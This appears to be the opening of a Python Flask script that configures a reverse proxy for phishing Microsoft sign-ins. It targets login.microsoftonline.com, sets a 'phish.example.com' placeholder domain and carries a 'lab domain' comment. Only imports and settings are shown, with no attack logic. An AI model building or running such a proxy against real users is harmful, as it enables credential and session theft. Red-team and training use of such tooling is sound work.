from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from flask import Flask, request, Response, redirect, make_response

TARGET_HOST = "login.microsoftonline.com"
TARGET_SCHEME = "https"
TARGET_BASE = f"{TARGET_SCHEME}://{TARGET_HOST}"
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8443
PHISH_DOMAIN = "phish.example.com"  # replace with lab domain
USE_SSL = True

